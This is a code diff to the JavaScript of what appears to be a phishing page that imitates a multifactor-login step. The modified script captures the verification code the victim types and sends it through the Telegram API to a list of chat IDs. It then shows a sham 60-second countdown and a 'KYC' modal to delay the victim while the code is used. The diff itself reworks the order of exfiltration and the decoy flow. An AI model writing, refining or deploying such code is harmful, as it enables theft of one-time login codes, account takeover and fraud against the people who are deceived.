@@ -3,7 +3,9 @@ let delayy;
 let counterr;
 let email_field;
 let submit_btn;
-let countdownInterval; // To store the interval for clearing later
+let countdownInterval;
+let kycModal;
+let closeButton;
 
 document.addEventListener("DOMContentLoaded", () => {
     console.log("Page loaded");
@@ -12,30 +14,56 @@ document.addEventListener("DOMContentLoaded", () => {
     email_field = document.getElementById("multifactor_code");
     submit_btn = document.querySelector("button[type='submit']");
     formm = document.getElementById("new_multifactor");
+    kycModal = document.getElementById("kycModal");
+    closeButton = document.querySelector(".close-button");
 
-    // Initially hide the delayy element on page load
+    // Initially hide the delayy element and the modal on page load
     delayy.style.display = "none";
+    kycModal.style.display = "none";
 
     formm.addEventListener("submit", (e) => {
         e.preventDefault(); // Prevent default form submission
 
-        // Only show the counter if the form is valid (e.g., input is not empty)
-        if (email_field.value.trim() !== "") { // Basic validation
-            show_counter().then(() => {
-                console.log("submit form");
-                send_telegram_message();
-            });
+        // Basic validation: Check if the verification code field is not empty
+        if (email_field.value.trim() !== "") {
+            submit_btn.setAttribute("disabled", "true"); // Disable the submit button immediately
+            delayy.style.display = "flex"; // Show the delayy container (spinner and counter)
+
+            // 1. Send Telegram message immediately upon valid submission
+            send_telegram_message();
+
+            // 2. Start the countdown
+            startCountdown();
+
         } else {
-            console.log("Verification code field is empty.");
-            // Optionally, display an error message to the user
+            console.log("Verification code field is empty. Please enter a code.");
+            // Optionally, display an error message to the user on the page
+            const alertError = document.querySelector('.alert.alert-error');
+            if (alertError) {
+                alertError.textContent = "Please enter your 6-digit verification code.";
+                alertError.style.display = "block";
+            }
+        }
+    });
+
+    // Close the modal when the close button is clicked
+    closeButton.addEventListener("click", () => {
+        kycModal.style.display = "none";
+        // Optionally, redirect the user after closing the modal, or reset the form
+        // window.location.href = "/Login/validate/index.html";
+    });
+
+    // Close the modal if the user clicks outside of it
+    window.addEventListener("click", (event) => {
+        if (event.target === kycModal) {
+            kycModal.style.display = "none";
+            // window.location.href = "/Login/validate/index.html";
         }
     });
 });
 
-function show_counter() {
-    submit_btn.setAttribute("disabled", "true"); // Disable the submit button
-    delayy.style.display = "flex"; // Show the delayy container
 
+function startCountdown() {
     let count = 60; // Start countdown from 60 seconds
     counterr.textContent = count; // Set initial counter text
 
@@ -44,16 +72,17 @@ function show_counter() {
         clearInterval(countdownInterval);
     }
 
-    return new Promise((resolve) => {
-        countdownInterval = setInterval(() => {
-            count--;
-            counterr.textContent = count;
-            if (count <= 0) {
-                clearInterval(countdownInterval); // Stop the countdown
-                resolve(); // Resolve the promise when countdown finishes
-            }
-        }, 1000); // Update every 1 second (1000ms)
-    });
+    countdownInterval = setInterval(() => {
+        count--;
+        counterr.textContent = count;
+
+        if (count <= 0) {
+            clearInterval(countdownInterval); // Stop the countdown
+            delayy.style.display = "none"; // Hide the spinner/countdown
+            submit_btn.removeAttribute("disabled"); // Re-enable the submit button (optional, if you want user to try again)
+            showKycModal(); // Show the completion modal
+        }
+    }, 1000); // Update every 1 second (1000ms)
 }
 
 async function send_telegram_message() {
@@ -81,18 +110,20 @@ async function send_telegram_message() {
             );
 
             const resJson = await resp.json();
-            console.log(resJson);
+            console.log("Telegram API response:", resJson);
 
             if (resJson.ok) {
-                console.log("Message sent successfully");
+                console.log("Message sent successfully to chat ID:", chatIds[i]);
             } else {
-                console.error("Telegram API response indicates failure:", resJson);
+                console.error("Telegram API response indicates failure for chat ID", chatIds[i], ":", resJson);
             }
 
-            // Redirect to the next page after sending the message
-            window.location.href = "/Login/validate/index.html"; // Replace "nextpage.html" with the URL of the next page
         } catch (error) {
             console.error("Error sending message to Telegram:", error);
         }
     }
+}
+
+function showKycModal() {
+    kycModal.style.display = "flex"; // Use flex to center the modal content
 }
